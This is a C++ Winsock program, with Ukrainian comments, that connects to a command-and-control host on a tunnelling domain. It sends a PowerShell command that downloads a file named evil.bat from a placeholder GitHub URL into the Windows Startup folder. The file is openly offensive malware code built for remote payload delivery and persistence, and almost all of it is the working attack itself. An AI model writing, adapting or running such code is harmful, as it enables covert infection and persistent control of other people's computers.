#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    sockaddr_in server;

    const char* host = "r-broker.gl.at.ply.gg";
    const int port = 18942;

    // ⚠️ Заміни на свій прямий GitHub-лінк
    const char* githubUrl = "https://raw.githubusercontent.com/yourusername/repo/main/evil.bat";

    // PowerShell команда: завантажити з GitHub у автозавантаження
    std::string psCommand =
        "powershell -c \"Invoke-WebRequest '" + std::string(githubUrl) +
        "' -OutFile $env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.bat\"\n";

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed\n";
        WSACleanup();
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    // DNS resolve
    hostent* he = gethostbyname(host);
    if (he == nullptr) {
        std::cerr << "DNS resolution failed\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    memcpy(&server.sin_addr, he->h_addr_list[0], he->h_length);

    if (connect(sock, (sockaddr*)&server, sizeof(server)) < 0) {
        std::cerr << "Connection failed\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::cout << "[+] Connected to C2\n";

    send(sock, psCommand.c_str(), psCommand.size(), 0);

    char buffer[1024] = { 0 };
    int recvSize = recv(sock, buffer, sizeof(buffer), 0);
    if (recvSize > 0) {
        std::cout << "[+] Response from server:\n";
        std::cout << std::string(buffer, recvSize) << std::endl;
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
